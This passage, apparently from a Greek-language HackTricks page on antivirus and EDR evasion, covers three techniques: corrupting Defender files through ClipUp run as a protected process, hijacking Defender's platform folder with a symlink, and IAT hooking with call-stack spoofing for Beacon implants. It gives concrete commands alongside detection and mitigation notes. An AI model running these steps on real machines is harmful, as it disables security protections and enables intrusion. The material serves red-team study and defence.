# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- Το υπογεγραμμένο system binary `C:\Windows\System32\ClipUp.exe` αυτο-εκκινείται και δέχεται παράμετρο για να γράψει ένα log αρχείο σε διαδρομή που καθορίζεται από τον καλούντα.
- Όταν εκκινείται ως διεργασία PPL, η εγγραφή αρχείου γίνεται με υποστήριξη PPL.
- Το ClipUp δεν μπορεί να αναλύσει διαδρομές που περιέχουν κενά· χρησιμοποιήστε 8.3 short paths για να δείξετε σε κανονικά προστατευμένες τοποθεσίες.

8.3 short path helpers
- Λίστα σύντομων ονομάτων: `dir /x` σε κάθε γονικό κατάλογο.
- Προσδιορισμός σύντομης διαδρομής στο cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) Εκκινήστε το LOLBIN που υποστηρίζει PPL (ClipUp) με `CREATE_PROTECTED_PROCESS` χρησιμοποιώντας έναν εκκινητή (π.χ., CreateProcessAsPPL).
2) Δώστε το όρισμα log-path του ClipUp για να αναγκάσετε τη δημιουργία αρχείου σε έναν προστατευμένο AV κατάλογο (π.χ., Defender Platform). Χρησιμοποιήστε 8.3 short names αν χρειάζεται.
3) Εάν το δυαδικό αρχείο-στόχος είναι συνήθως ανοιχτό/κλειδωμένο από το AV ενώ τρέχει (π.χ., MsMpEng.exe), προγραμματίστε την εγγραφή κατά την εκκίνηση προτού ξεκινήσει το AV εγκαθιστώντας μια υπηρεσία αυτόματης εκκίνησης που τρέχει αξιόπιστα νωρίτερα. Επαληθεύστε τη σειρά εκκίνησης με το Process Monitor (boot logging).
4) Κατά την επανεκκίνηση, η εγγραφή με υποστήριξη PPL γίνεται πριν το AV κλειδώσει τα binaries του, διαφθείροντας το αρχείο-στόχο και αποτρέποντας την εκκίνηση.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Σημειώσεις και περιορισμοί
- Δεν μπορείτε να ελέγξετε το περιεχόμενο που γράφει το ClipUp πέρα από την τοποθέτηση· το primitive προορίζεται για αλλοίωση αντί για ακριβή έγχυση περιεχομένου.
- Απαιτεί local admin/SYSTEM για την εγκατάσταση/εκκίνηση μιας υπηρεσίας και ένα παράθυρο επανεκκίνησης.
- Ο χρόνος είναι κρίσιμος: ο στόχος δεν πρέπει να είναι ανοιχτός· η εκτέλεση κατά την εκκίνηση αποφεύγει τα κλειδώματα αρχείων.

Ανιχνεύσεις
- Δημιουργία διαδικασίας του `ClipUp.exe` με ασυνήθιστα ορίσματα, ιδιαίτερα όταν έχει ως γονέα μη-τυπικούς launchers, κατά την εκκίνηση.
- Νέες υπηρεσίες ρυθμισμένες να auto-start ύποπτα binaries και να ξεκινούν σταθερά πριν το Defender/AV. Ερευνήστε τη δημιουργία/τροποποίηση υπηρεσιών πριν από σφάλματα εκκίνησης του Defender.
- Παρακολούθηση ακεραιότητας αρχείων στα Defender binaries/Platform directories· απροσδόκητες δημιουργίες/τροποποιήσεις αρχείων από διαδικασίες με protected-process flags.
- ETW/EDR telemetry: αναζητήστε διαδικασίες που δημιουργήθηκαν με `CREATE_PROTECTED_PROCESS` και ανωμαλίες στη χρήση επιπέδων PPL από μη-AV binaries.

Μέτρα μετριασμού
- WDAC/Code Integrity: περιορίστε ποια signed binaries μπορούν να τρέξουν ως PPL και υπό ποιους γονείς· μπλοκάρετε την κλήση του ClipUp εκτός νόμιμων πλαισίων.
- Service hygiene: περιορίστε τη δημιουργία/τροποποίηση auto-start υπηρεσιών και παρακολουθήστε τη χειραγώγηση της σειράς εκκίνησης.
- Βεβαιώστε ότι το Defender tamper protection και τα early-launch protections είναι ενεργοποιημένα· ελέγξτε σφάλματα εκκίνησης που υποδεικνύουν αλλοίωση binary.
- Σκεφτείτε να απενεργοποιήσετε τη δημιουργία 8.3 short-name σε volumes που φιλοξενούν security tooling εάν είναι συμβατό με το περιβάλλον σας (δοκιμάστε διεξοδικά).

Αναφορές για PPL και εργαλεία
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Παρέμβαση στο Microsoft Defender μέσω Platform Version Folder Symlink Hijack

Το Windows Defender επιλέγει την πλατφόρμα από την οποία εκτελείται με την απαρίθμηση των υποφακέλων κάτω από:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Επιλέγει τον υποφάκελο με τη μεγαλύτερη λεξικογραφική συμβολοσειρά έκδοσης (π.χ., `4.18.25070.5-0`), και στη συνέχεια ξεκινά τις διαδικασίες υπηρεσίας Defender από εκεί (ενημερώνοντας αναλόγως τα service/registry paths). Αυτή η επιλογή εμπιστεύεται τις εγγραφές καταλόγων συμπεριλαμβανομένων των directory reparse points (symlinks). Ένας administrator μπορεί να αξιοποιήσει αυτό για να ανακατευθύνει το Defender σε ένα attacker-writable path και να επιτύχει DLL sideloading ή διακοπή υπηρεσίας.

Προαπαιτούμενα
- Local Administrator (απαιτείται για τη δημιουργία directories/symlinks κάτω από τον φάκελο Platform)
- Δυνατότητα επανεκκίνησης ή ενεργοποίησης της επανεπιλογής πλατφόρμας Defender (service restart on boot)
- Μόνο built-in εργαλεία απαιτούνται (mklink)

Γιατί λειτουργεί
- Το Defender μπλοκάρει εγγραφές στους δικούς του φακέλους, αλλά η επιλογή πλατφόρμας εμπιστεύεται τις εγγραφές καταλόγων και επιλέγει τη λεξικογραφικά υψηλότερη έκδοση χωρίς να επαληθεύει ότι ο στόχος επιλύεται σε προστατευμένο/έμπιστο path.

Βήμα-προς-βήμα (παράδειγμα)
1) Ετοιμάστε ένα εγγράψιμο κλώνο του τρέχοντος platform folder, π.χ. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Δημιουργήστε έναν symlink καταλόγου υψηλότερης έκδοσης μέσα στο Platform που δείχνει στον φάκελό σας:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Επιλογή Trigger (reboot συνιστάται):
```cmd
shutdown /r /t 0
```
4) Επαληθεύστε ότι το MsMpEng.exe (WinDefend) εκτελείται από την ανακατευθυνόμενη διαδρομή:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Θα πρέπει να παρατηρήσετε το νέο μονοπάτι διεργασίας στο `C:\TMP\AV\` και τη ρύθμιση/το μητρώο της υπηρεσίας που αντικατοπτρίζουν αυτήν τη θέση.

Post-exploitation options
- DLL sideloading/code execution: Αποθέστε/αντικαταστήστε DLLs που φορτώνει ο Defender από τον φάκελο της εφαρμογής του για να εκτελέσετε κώδικα στις διεργασίες του Defender. Δείτε την ενότητα παραπάνω: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Αφαιρέστε το version-symlink έτσι ώστε στην επόμενη εκκίνηση το διαμορφωμένο μονοπάτι να μην επιλύεται και ο Defender να αποτυγχάνει να ξεκινήσει:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Σημειώστε ότι αυτή η τεχνική δεν παρέχει privilege escalation από μόνη της· απαιτεί admin rights.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Οι Red teams μπορούν να μετακινήσουν τη runtime evasion έξω από το C2 implant και μέσα στο ίδιο το target module κάνοντας hook το Import Address Table (IAT) και δρομολογώντας επιλεγμένα APIs μέσω attacker-controlled, position‑independent code (PIC). Αυτό γενικεύει την αποφυγή εντοπισμού πέρα από τη μικρή επιφάνεια API που εκθέτουν πολλά kits (π.χ., CreateProcessA) και επεκτείνει τις ίδιες προστασίες σε BOFs και post‑exploitation DLLs.

High-level approach
- Τοποθετήστε ένα PIC blob δίπλα στο target module χρησιμοποιώντας reflective loader (prepended ή companion). Το PIC πρέπει να είναι self‑contained και position‑independent.
- Καθώς το host DLL φορτώνεται, περιηγηθείτε στο IMAGE_IMPORT_DESCRIPTOR και τροποποιήστε τις καταχωρήσεις του IAT για στοχευμένα imports (π.χ., CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) ώστε να δείχνουν σε λεπτά PIC wrappers.
- Κάθε PIC wrapper εκτελεί evasions πριν από tail‑calling στη πραγματική διεύθυνση API. Τυπικές evasions περιλαμβάνουν:
  - Memory mask/unmask γύρω από την κλήση (π.χ., encrypt beacon regions, RWX→RX, αλλαγή ονομάτων/permissions σε σελίδες) και επαναφορά μετά την κλήση.
  - Call‑stack spoofing: κατασκευή ενός benign stack και μετάβαση στην target API ώστε η call‑stack analysis να επιλύει σε αναμενόμερα frames.
- Για συμβατότητα, εξάγετε ένα interface ώστε ένα Aggressor script (ή ισοδύναμο) να μπορεί να καταχωρίσει ποιες APIs θα κάνουν hook για Beacon, BOFs και post‑ex DLLs.

Why IAT hooking here
- Λειτουργεί για οποιονδήποτε κώδικα που χρησιμοποιεί το hooked import, χωρίς να τροποποιείται ο κώδικας του εργαλείου ή να βασίζεται στο Beacon για να προωθήσει συγκεκριμένα APIs.
- Καλύπτει post‑ex DLLs: το hooking του LoadLibrary* σάς επιτρέπει να παρεμβαίνετε σε φορτώματα modules (π.χ., System.Management.Automation.dll, clr.dll) και να εφαρμόζετε την ίδια μάσκα/stack evasion στις κλήσεις API τους.
- Επαναφέρει την αξιόπιστη χρήση process‑spawning post‑ex εντολών ενάντια σε detections βασισμένα σε call‑stack, τυλίγοντας CreateProcessA/W.

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Σημειώσεις
- Εφαρμόστε το patch μετά τις relocations/ASLR και πριν από την πρώτη χρήση του import. Reflective loaders όπως TitanLdr/AceLdr δείχνουν hooking κατά το DllMain του φορτωμένου module.
- Κρατήστε τα wrappers tiny και PIC‑safe· επιλύστε το true API μέσω της αρχικής τιμής IAT που καταγράψατε πριν το patch ή μέσω του LdrGetProcedureAddress.
- Χρησιμοποιήστε RW → RX transitions για PIC και αποφύγετε να αφήνετε writable+executable σελίδες.

Call‑stack spoofing stub
- Draugr‑style PIC stubs build a fake call chain (return addresses into benign modules) and then pivot into the real API.
- This defeats detections that expect canonical stacks from Beacon/BOFs to sensitive APIs.
- Pair with stack cutting/stack stitching techniques to land inside expected frames before the API prologue.

Λειτουργική ενσωμάτωση
- Prepend the reflective loader to post‑ex DLLs so the PIC and hooks initialise automatically when the DLL is loaded.
- Use an Aggressor script to register target APIs so Beacon and BOFs transparently benefit from the same evasion path without code changes.

Σκέψεις Detection/DFIR
- IAT integrity: entries that resolve to non‑image (heap/anon) addresses; periodic verification of import pointers.
- Stack anomalies: return addresses not belonging to loaded images; abrupt transitions to non‑image PIC; inconsistent RtlUserThreadStart ancestry.
- Loader telemetry: in‑process writes to IAT, early DllMain activity that modifies import thunks, unexpected RX regions created at load.
- Image‑load evasion: if hooking LoadLibrary*, monitor suspicious loads of automation/clr assemblies correlated with memory masking events.

Σχετικά building blocks και παραδείγματα
- Reflective loaders that perform IAT patching during load (e.g., TitanLdr, AceLdr)
- Memory masking hooks (e.g., simplehook) and stack‑cutting PIC (stackcutting)
- PIC call‑stack spoofing stubs (e.g., Draugr)

## Αναφορές

- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)

- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)

{{#include ../banners/hacktricks-training.md}}
